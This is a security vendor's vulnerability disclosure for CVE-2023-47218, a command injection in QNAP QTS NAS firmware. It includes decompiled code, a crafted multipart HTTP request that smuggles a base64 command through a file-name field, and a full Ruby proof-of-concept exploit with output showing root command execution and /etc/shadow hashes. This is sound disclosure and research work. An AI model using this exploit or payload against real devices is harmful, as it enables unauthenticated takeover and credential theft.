CVE-2023-47218 has been addressed in multiple versions of QTS, QuTS hero and QuTScloud. QNAP prioritizes security, actively partnering with esteemed researchers like Rapid7 to promptly address and rectify vulnerabilities, ensuring the safety of our customers. For more information, please see: <https://www.qnap.com/en/security-advisory/qsa-23-57>

Dedicated to excellence, QNAP (Quality Network Appliance Provider) offers holistic solutions encompassing software development, hardware design, and in-house manufacturing. Beyond mere storage, QNAP envisions NAS as a robust platform, facilitating cloud-based networking for users to seamlessly host and advance artificial intelligence analysis, edge computing, and data integration on their QNAP solutions.

## Remediation

QNAP released a fix for this vulnerability on January 25, 2024. According to QNAP, the following versions remediate the issue:

* QTS 5.1.x - Fixed in `QTS 5.1.5.2645 build 20240116` and later
* QuTS hero h5.1.x - Fixed in `QuTS hero h5.1.5.2647 build 20240118` and later

For more details please read the [QNAP security advisory](https://www.qnap.com/en/security-advisory/qsa-23-57).

QNAP have provided the following remediation guidelines:

> To secure your QNAP NAS, we recommend regularly updating your system to the latest version to benefit from vulnerability fixes. You can check the [product support status](https://www.qnap.com/en/product/status) to see the latest updates available to your NAS model.

## Analysis

During our analysis we targeted the QTS based firmware, version 5.1.2.2533 for a QNAP TS-464 NAS device. We extracted the file system using the following steps:

```
user@dev:~/qnap/$ ls
TS-X64_20230926-5.1.2.2533.zip
# Unzip the firmware.
user@dev:~/qnap/$ unzip TS-X64_20230926-5.1.2.2533.zip
Archive:  TS-X64_20230926-5.1.2.2533.zip
  inflating: TS-X64_20230926-5.1.2.2533.img
user@dev:~/qnap/$ ls
TS-X64_20230926-5.1.2.2533.img  TS-X64_20230926-5.1.2.2533.zip
# Decrypt the firmware using the tool qnap-qts-fw-cryptor.
user@dev:~/qnap/$ python3 qnap-qts-fw-cryptor.py d QNAPNASVERSION5 TS-X64_20230926-5.1.2.2533.img TS-X64_20230926-5.1.2.2533.tgz
Signature check OK, model TS-X64, version 5.1.2
Encrypted 1048576 of all 220239236 bytes
[99% left]
[99% left]
[99% left]
...snip
[02% left]
[00% left]
[00% left]
user@dev:~/qnap/$ ls
qnap-qts-fw-cryptor.py  TS-X64_20230926-5.1.2.2533.img  TS-X64_20230926-5.1.2.2533.tgz  TS-X64_20230926-5.1.2.2533.zip
# Recreate the root file system.
user@dev:~/qnap/$ mkdir firmware
user@dev:~/qnap/$ tar -xvzf TS-X64_20230926-5.1.2.2533.tgz -C ./firmware/
user@dev:~/qnap/$ binwalk -e firmware/initrd.boot
user@dev:~/qnap/$ binwalk -e firmware/_initrd.boot.extracted/0
user@dev:~/qnap/$ binwalk -e firmware/rootfs2.bz
user@dev:~/qnap/$ binwalk -e firmware/_rootfs2.bz.extracted/0
user@dev:~/qnap/$ mv firmware/_rootfs2.bz.extracted/_0.extracted/* firmware/_initrd.boot.extracted/_0.extracted/cpio-root/

```

When decompiling the `/home/httpd/cgi-bin/quick/quick.cgi` binary, we can see a function `switch_os` can be called if an HTTP parameter named `func` has a value `switch_os`.

```
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  __int64 Input; // rax
  __int64 input; // rbp
  _BOOL4 v5; // ebx
  __int64 func_param; // rax
  __int64 func_param_; // r12
  bool v8; // zf
  unsigned int v9; // ebp
  __int64 todo_param; // rbx

  sub_415C82(1LL, a2, a3);
  dword_630794 = sub_415F8B();
  dword_630790 = sub_415F41();
  dword_63079C = sub_415F1E();
  Input = CGI_Get_Input();
  input = Input;
  if ( Input )
  {
    func_param = CGI_Find_Parameter(Input, (char *)"func");
    func_param_ = func_param;
    if ( func_param )
    {
      v8 = strcmp(*(const char **)(func_param + 8), "main") == 0;
      v5 = !v8;
      if ( v8 )
      {
        v9 = rand();
        puts("301 Moved Permanently");
        printf("Location: /cgi-bin/quick/html/index.html?count=%d\n", v9);
        return v5;
      }
      if ( !CGI_Find_Parameter(input, "todo") )
        goto LABEL_6;
      todo_param = CGI_Find_Parameter(input, "todo");
      if ( !strcmp(*(const char **)(func_param_ + 8), "switch_os") )
      {
        if ( (unsigned int)switch_os(*(_QWORD *)(todo_param + 8), input) ) // <---

```

The `switch_os` function will call a function `uploaf_firmware_image` if an HTTP parameter named `todo` has a value of `uploaf_firmware_image`.

```
__int64 __fastcall switch_os(const char *todo_param, const char *input)
{
  __int64 os_name_param; // rax
  __int64 v3; // rbx
  FILE *v4; // rax
  FILE *v5; // rbp
  const char *v6; // rax
  char *v7; // rbp
  __int64 v8; // rdx
  __int64 result; // rax
  __int64 v10; // rdx
  char os_name[32]; // [rsp+0h] [rbp-38h] BYREF

  memset(os_name, 0, sizeof(os_name));
  os_name_param = CGI_Find_Parameter((__int64)input, "os_name");
  if ( os_name_param )
    strncpy(os_name, *(const char **)(os_name_param + 8), 31uLL);
  if ( !strcmp(todo_param, "uploaf_firmware_image") )
  {
    v3 = uploaf_firmware_image(); // <---

```

In the function `uploaf_firmware_image`, we can see a helper function `CGI_Upload` is used to read a value from the CGI request into a local variable called `file_name` below.

```
__int64 uploaf_firmware_image()
{
  //...snip...
  if ( (unsigned int)CGI_Upload((__int64)"/mnt/update", 0LL, (__int64)file_name) ) // <---
    return json_pack(
             "{si si ss}",
             4341610LL,
             200LL,
             "error_code",
             4LL,
             "error_message",
             "upload full_path_filename fail.");
  sprintf(file, "%s/%s", "/mnt/update", file_name); // <---
  if ( chmod(file, 436u) < 0 )
    return json_pack(
             "{si si ss}",
             4341610LL,
             200LL,
             "error_code",
             5LL,
             "error_message",
             "upload full_path_filename fail.");
  if ( !fork() )
  {
    v2 = open("/dev/null", 2);
    if ( v2 != -1 )
    {
      close(0);
      dup2(v2, 0);
      close(1);
      dup2(v2, 1);
      close(2);
      dup2(v2, 2);
      close(v2);
    }
    sprintf(buf266, "echo 0 > %s", "/tmp/update_process");
    system(buf266);
    sprintf(buf266, "/usr/share/updater/update_fw -f \"%s\"", file); // <---
    if ( system(buf266) ) // <--- command injection.
    {
      Set_Private_Profile_Integer("Switch OS", "Step00 Status", 7LL, "/tmp/quick_tmp.conf");
    }

```

We can see above that the value extracted by `CGI_Upload` will be used to construct an OS command, which is then passed to a call to `system` to execute the command. If an attacker can supply a double quote character in the file name string, a command injection vulnerability can be achieved.

To understand how an attacker can achieve this, we must examine `CGI_Upload` from the `\usr\lib\libuLinux_fcgi.so.0.0` binary. `CGI_Upload` will call `cgi_save_file_ex` to extract several fields from a POST request's multipart form data.

```
__int64 __fastcall cgi_save_file_ex(__int64 a1, char *a2, int a3)
{
// ...snip...
  CGI_Get_Http_Info(&dest);
// ...snip...
        strtok(v36, ";");
        strtok(0LL, ";");
        v18 = strtok(0LL, "\n");
        if ( v18 )
          snprintf(v36, 0x1000uLL, "%s", v18);
        strtok(v36, "\"");
        v19 = strtok(0LL, "\"");
        if ( v19 )
          strncpy(a2, v19, n);
        if ( dest.useragent_type == 3 ) // <---
          trans_http_str((__int64)a2, (__int64)a2, 1LL); // <---

```

The call to `CGI_Get_Http_Info` at the beginning of the function will retrieve some metadata about the request. The form field values are extracted (we have omitted most of the logic here for brevity). When storing an extracted field value, a check is done against the requested metadata, and if the user agent was given an enum value of 3, a special call to `trans_http_str` will occur. The function `trans_http_str` will URL decode any value we pass it, e.g. `%22` will be decoded to a double quote character. This will allow an attacker to escape the command string in the function `uploaf_firmware_image` and achieve command injection.

To understand why the metadata’s user agent type may be set to 3, we can examine the function `CGI_Get_Http_Info`, as shown below.

```
char *__fastcall CGI_Get_Http_Info(struct_dest *dest)
{
  // ...snip…
  v10 = (const char *)QFCGI_getenv("HTTP_USER_AGENT");
  v11 = v10;
  if ( !v10 )
  {
LABEL_29:
    dest->useragent_type = 0;
    goto LABEL_16;
  }
  if ( strstr(v10, "Safari") )
  {
    dest->useragent_type = 7;
    goto LABEL_16;
  }
  if ( !strstr(v11, "MSIE") )
  {
    if ( strstr(v11, "Mozilla") )
    {
      if ( strstr(v11, "Macintosh") )
        dest->useragent_type = 3; // <---
      else
        dest->useragent_type = strstr(v11, "Linux") == 0LL ? 4 : 6;
      goto LABEL_16;
    }
    goto LABEL_29;
  }

```

We can see that if the HTTP request’s user agent contains both the string “Mozilla” and the string “Macintosh”, then the user agent type will be set to 3.

We can therefore exploit this vulnerability with an HTTP POST request that looks like this:

```
POST /cgi-bin/quick/quick.cgi?func=switch_os&todo=uploaf_firmware_image HTTP/1.1
Host: 192.168.86.42:8080
User-Agent: Mozilla Macintosh
Accept: */*
Content-Length: 164
Content-Type: multipart/form-data;boundary="avssqwfz"

--avssqwfz
Content-Disposition: form-data; xxpcscma="field2"; zczqildp="%22$($(echo -n aWQ=|base64 -d)>a)%22"
Content-Type: text/plain

skfqduny
--avssqwfz–

```

Note the use of the URL encoded double quote `%22` to perform the command injection, followed by the execution of a base64 encoded command (“id” in the example above). Finally, we can see the requested user agent is “Mozilla Macintosh” to enable the URL decoding of multipart form fields.

## Proof-of-Concept Exploit

The following is a Ruby proof-of-concept exploit called `qnap_hax.rb` that can be used to successfully exploit a vulnerable target.

```
require 'optparse'
require 'base64'
require 'socket'

def log(txt)
  $stdout.puts txt
end

def rand_string(len)
  (0...len).map {'a'.ord + rand(26)}.pack('C*')
end

def send_http_data(ip, port, data)
  s = TCPSocket.open(ip, port)

  s.write(data)

  result = ''

  while line = s.gets
    result << line
  end

  s.close

  return result
end

def hax_single_command(ip, port, cmd, read_output=true, output_file_name='a')

  payload = "\"$($(echo -n #{Base64.strict_encode64(cmd)}|base64 -d)"

  if read_output
    payload << ">#{output_file_name}"
  end

  payload << ")\""

  payload.gsub!("\"", '%22')
  payload.gsub!(";", '%3B')

  if payload.length > 127
    log "[-] Error, the command is too long (#{payload.length}), must be < 128 bytes."
    return false
  end

  boundary = rand_string(8)

  txt  = "--#{boundary}\r\n"
  txt << "Content-Disposition: form-data; #{rand_string(8)}=\"field2\"; #{rand_string(8)}=\"#{payload}\"\r\n"
  txt << "Content-Type: text/plain\r\n"
  txt << "\r\n"
  txt << "#{rand_string(8)}\r\n"
  txt << "--#{boundary}--\r\n"

  body  = "POST /cgi-bin/quick/quick.cgi?func=switch_os&todo=uploaf_firmware_image HTTP/1.1\r\n"
  body << "Host: #{ip}:#{port}\r\n"
  body << "User-Agent: Mozilla Macintosh\r\n"
  body << "Accept: */*\r\n"
  body << "Content-Length: #{txt.bytesize}\r\n"
  body << "Content-Type: multipart/form-data;boundary=\"#{boundary}\"\r\n"
  body << "\r\n"
  body << txt

  result = send_http_data(ip, port, body)

  if result&.match? /HTTP\/1\.\d 200 OK/
    log "[+] Success, executed command: #{cmd}"
  else
    log "[-] Failed to execute command: #{cmd}"
    log result

    return false
  end

  if read_output

    result = send_http_data(ip, port, "GET /cgi-bin/quick/#{output_file_name} HTTP/1.1\r\nHost: #{ip}:#{port}\r\nAccept: */*\r\n\r\n")

    if result&.match? /HTTP\/1\.\d 200 OK/

      found_content = false

      result.lines.each do |line|
        if line == "\r\n"
          found_content = true
          next
        end

        log line if found_content
      end
    else
      log "[-] Failed to read back output."
      log result

      return false
    end
  end

  return true
end

def hax(options)

  log "[+] Targeting: #{options[:ip]}:#{options[:port]}"

  output_file_name = 'a'

  return unless hax_single_command(options[:ip], options[:port], options[:cmd], true, output_file_name)

  return unless hax_single_command(options[:ip], options[:port], "rm -f #{output_file_name}", false, output_file_name)

  return unless hax_single_command(options[:ip], options[:port], 'rm -f /mnt/HDA_ROOT/update/*', false, output_file_name)
end

options = {}

OptionParser.new do |opts|
  opts.banner = "Usage: hax1.rb [options]"

  opts.on("-t", "--target TARGET", "Target IP") do |v|
    options[:ip] = v
  end

  opts.on("-p", "--port PORT", "Target Port") do |v|
    options[:port] = v.to_i
  end

  opts.on("-c", "--cmd COMMAND", "Command to execute") do |v|
    options[:cmd] = v
  end
end.parse!

unless options.key? :ip
  log '[-] Error, you must pass a target IP: -t TARGET'
  return
end

unless options.key? :port
  log '[-] Error, you must pass a target port: -p PORT'
  return
end

unless options.key? :cmd
  log '[-] Error, you must pass a command to execute: -c COMMAND'
  return
end

log "[+] Starting..."

hax(options)

log "[+] Finished."

```
## Exploitation

To verify this vulnerability, after manually extracting the firmware, we used the QEMU emulator to run the built-in web server. As the vulnerable component `quick.cgi` is present in an uninitialized system, we manually enabled the feature, allowing a remote attacker to access the vulnerable CGI script over HTTP.

### Emulate the Firmware

We performed the following steps to run the builtin web server `_httpd_` via QEMU, and enable the vulnerable `quick.cgi` component.

```
user@dev:~/qnap/$ cd firmware/_initrd.boot.extracted/_0.extracted/cpio-root/
# Copy the qemu-x86_64-static binary into the root file system folder.
user@dev:~/qnap/firmware/_initrd.boot.extracted/_0.extracted/cpio-root$ cp $(which qemu-x86_64-static) .
# Run _thttpd_ via QEMU.
user@dev:~/qnap/firmware/_initrd.boot.extracted/_0.extracted/cpio-root$ sudo chroot . ./qemu-x86_64-static usr/local/sbin/_thttpd_ -p 8080  -nor -nos -u admin -d /home/httpd -c '**.*' -h 0.0.0.0 -i /var/lock/._thttpd_.pid
# Verify the HTTP server is running.
user@dev:~/qnap/firmware/_initrd.boot.extracted/_0.extracted/cpio-root$ sudo netstat -lnp | grep 8080
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      1195417/./qemu-x86_
# Drop to a shell via QEMU...
user@dev:~/qnap/firmware/_initrd.boot.extracted/_0.extracted/cpio-root$ sudo chroot . /bin/sh
# Enable the component quick.cgi
sh-3.2# chmod +x /home/httpd/cgi-bin/quick/quick.cgi
# Fix a linker issue with QEMU.
sh-3.2# rm /lib/libnl-3.so.200
sh-3.2# ln -s /lib/libnl-3.so.200.24.0 /lib/libnl-3.so.200
# This folder will be present in a NAS device containing a hard drive.
sh-3.2# mkdir /mnt/HDA_ROOT

```
### Run the PoC

Finally, to verify the vulnerability, from a remote machine we ran the exploit script `qnap_hax.rb` against the remote target, and successfully executed arbitrary OS commands.

```
>ruby qnap_hax.rb -t 192.168.86.42 -p 8080 -c id
[+] Starting...
[+] Targeting: 192.168.86.42:8080
[+] Success, executed command: id
uid=0(admin) gid=0(administrators) groups=0(administrators),100(everyone)
[+] Success, executed command: rm -f a
[+] Success, executed command: rm -f /mnt/HDA_ROOT/update/*
[+] Finished.

>ruby qnap_hax.rb -t 192.168.86.42 -p 8080 -c "cat /etc/shadow"
[+] Starting...
[+] Targeting: 192.168.86.42:8080
[+] Success, executed command: cat /etc/shadow
admin:$1$$CoERg7ynjYLdj2j4glJ34.:14233:0:99999:7:::
guest:$1$$ysap7EeB9ODCtO46Psdbq/:14233:0:99999:7:::
[+] Success, executed command: rm -f a
[+] Success, executed command: rm -f /mnt/HDA_ROOT/update/*
[+] Finished.

```
## Rapid7 Customers

An unauthenticated vulnerability check for CVE-2023-47218 will be available to InsightVM and Nexpose customers as of the February 13, 2024 content release.

## Timeline

* **November 9, 2023:** Rapid7 makes initial contact with QNAP Product Security Incident Response Team (PSIRT).
* **November 13, 2023:** Rapid7 provides QNAP with a detailed technical advisory.
* **November 27, 2023:** Rapid7 provides QNAP with a standalone proof of concept exploit.
* **December 5, 2023:** QNAP confirms report findings and assigns CVE-2023-47218 to the vulnerability. Rapid7 suggests January 8, 2024 as a coordinated disclosure date.
* **December 7, 2023:** Vendor informs Rapid7 they are looking to complete fixes by the end of January; they request an extension to February 7, 2024 for disclosure.
* **December 7, 2023:** Rapid7 agrees to February 7, 2024 as a coordinated disclosure date and requests that QNAP review our [disclosure policy](https://www.rapid7.com/security/disclosure/). Rapid7 also reinforces that coordinated disclosure means patches, advisories, and other vulnerability details are released at the same time, without [silently patching](https://www.rapid7.com/blog/post/2022/06/06/the-hidden-harm-of-silent-patches/) security issues.
* **December 13, 2023:** Rapid7 requests that vendor re-confirm timeline; vendor confirms February 7, 2024 for disclosure, acknowledges Rapid7’s disclosure policy.
* **December 18, 2023:** Rapid7 requests additional information about vendor-supplied mitigation guidance and affected products; vendor sends additional info to Rapid7.
* **January 8, 2024 - January 10, 2024:** Rapid7 requests an update and additional information.
* **January 25, 2024 - January 26, 2024:** Vendor contacts Rapid7 and informs us they have released patches for this vulnerability. Vendor requests that Rapid7 wait until February 26, 2024 to publish our disclosure. Rapid7 requests further information on why disclosure was not coordinated despite previous communications. QNAP and Rapid7 discuss and agree to publish advisories jointly on February 13, 2024.
* **February 13, 2024:** This disclosure.

#### POST TAGS

* [Vulnerability Disclosure](/blog/tag/vulnerability-disclosure/ "Vulnerability Disclosure")

#### SHARING IS CARING

#### AUTHOR

[Stephen Fewer](/blog/author/sfewer-r7/ "Stephen Fewer")

Stephen is a Principal Security Researcher at Rapid7, with a focus on software vulnerabilities and exploitation.

[View Stephen's Posts](/blog/author/sfewer-r7/)

![](https://blog.rapid7.com/content/images/2024/02/emergent-threat-banner-1-1.jpeg)

## Topics

* [Metasploit
   *(663)*](/blog/tag/metasploit/)
* [Vulnerability Management
   *(366)*](/blog/tag/vulnerability-management/)
* [Research
   *(243)*](/blog/tag/research/)
* [Detection and Response
   *(207)*](/blog/tag/detection-and-response/)
* [Vulnerability Disclosure
   *(150)*](/blog/tag/vulnerability-disclosure/)
* [Emergent Threat Response
   *(145)*](/blog/tag/emergent-threat-response/)
* [Cloud Security
   *(137)*](/blog/tag/cloud-security/)
* [Security Operations
   *(21)*](/blog/tag/secops/)

## Popular Tags

* [Metasploit](/blog/tag/metasploit/)
* [Metasploit Weekly Wrapup](/blog/tag/metasploit-weekly-wrapup/)
* [Vulnerability Management](/blog/tag/vulnerability-management/)
* [Research](/blog/tag/research/)
* [Detection and Response](/blog/tag/detection-and-response/)
* [Logentries](/blog/tag/logentries/)

## Related Posts

Lorex 2K Indoor Wi-Fi Security Camera: Multiple Vulnerabilities (FIXED)

[Read More](/blog/post/2024/12/03/lorex-2k-indoor-wi-fi-security-camera-multiple-vulnerabilities-fixed/)

Multiple Vulnerabilities in Wowza Streaming Engine (Fixed)

[Read More](/blog/post/2024/11/20/multiple-vulnerabilities-in-wowza-streaming-engine-fixed/)

CVE-2024-45195: Apache OFBiz Unauthenticated Remote Code Execution (Fixed)

[Read More](/blog/post/2024/09/05/cve-2024-45195-apache-ofbiz-unauthenticated-remote-code-execution-fixed/)

CVE-2024-6922: Automation Anywhere Automation 360 Server-Side Request Forgery

[Read More](/blog/post/2024/07/26/cve-2024-6922-automation-anywhere-automation-360-server-side-request-forgery/)

## Related Posts

[IoT

Lorex 2K Indoor Wi-Fi Security Camera: Multiple Vulnerabilities (FIXED)

Read Full Post](/blog/post/2024/12/03/lorex-2k-indoor-wi-fi-security-camera-multiple-vulnerabilities-fixed/)

[Vulnerability Disclosure

Multiple Vulnerabilities in Wowza Streaming Engine (Fixed)

Read Full Post](/blog/post/2024/11/20/multiple-vulnerabilities-in-wowza-streaming-engine-fixed/)

[Vulnerability Disclosure

CVE-2024-45195: Apache OFBiz Unauthenticated Remote Code Execution (Fixed)

Read Full Post](/blog/post/2024/09/05/cve-2024-45195-apache-ofbiz-unauthenticated-remote-code-execution-fixed/)

[Vulnerability Disclosure

CVE-2024-6922: Automation Anywhere Automation 360 Server-Side Request Forgery

Read Full Post](/blog/post/2024/07/26/cve-2024-6922-automation-anywhere-automation-360-server-side-request-forgery/)

[View All Posts](/blog/posts/)

Search

[BACK TO TOP
![](/includes/img/up-arrow-lightgray.png?width=1200)](#__)

[![Rapid7 logo](/includes/img/Rapid7_logo.svg?width=1200&quality=90)](/)
CUSTOMER SUPPORT
+1-866-390-8113 (Toll Free)
SALES SUPPORT
+1-866-772-7437 (Toll Free)
Need to report an Escalation or a Breach?
[Get Help](/services/incident-response-customer-escalation/)

SOLUTIONS
[The Command Platform](/platform/)
[Exposure Command](/products/command/exposure-management/)
[Managed Threat Complete](/services/managed-detection-and-response-mdr/)

SUPPORT & RESOURCES
[Product Support](https://www.rapid7.com/for-customers/)
[Resource Library](https://www.rapid7.com/resources/)
[Our Customers](https://www.rapid7.com/customers/)
[Events & Webcasts](https://www.rapid7.com/about/events-webcasts/)
[Training & Certification](https://www.rapid7.com/services/training-certification/)
[Cybersecurity Fundamentals](https://www.rapid7.com/fundamentals/)
[Vulnerability & Exploit Database](https://www.rapid7.com/db/)

ABOUT US
[Company](https://www.rapid7.com/about/company/)
[Diversity, Equity, and Inclusion](https://www.rapid7.com/about/diversity-equity-and-inclusion/)
[Leadership](https://www.rapid7.com/about/leadership/)
[News & Press Releases](https://www.rapid7.com/about/news/)
[Public Policy](https://www.rapid7.com/about/public-policy/)
[Open Source](https://www.rapid7.com/open-source/)
[Investors](https://investors.rapid7.com/overview/default.aspx)

CONNECT WITH US
[Contact](https://www.rapid7.com/contact/)
[Blog](https://www.rapid7.com/blog/)
[Support Login](https://insight.rapid7.com/login)
[Careers](https://careers.rapid7.com/careers-home)

© Rapid7
[Legal Terms](/legal/)
  |   [Privacy Policy](/privacy-policy/)
  |   [Export Notice](/export-notice/)
  |   [Trust](/trust/)
  |   Do Not Sell or Share My Personal Information
  |   Cookie Preferences

Contact Us

## Submit your information and we will get in touch with you.

#### Thank you for contacting us.

##### We will be in touch shortly.

![Rapid7 logo](/includes/img/logo-black.png)

### General:

info@rapid7.com

### Sales:

+1-866-772-7437
sales@rapid7.com

### Support:

+1–866–390–8113 (toll free)
support@rapid7.com

### Incident Response:

1-844-727-4347

[More Contact Info](/contact/)

## Never miss a blog

Get the latest stories, expertise, and news about security today.

You’re almost done!
 Check your email to confirm your subscription.


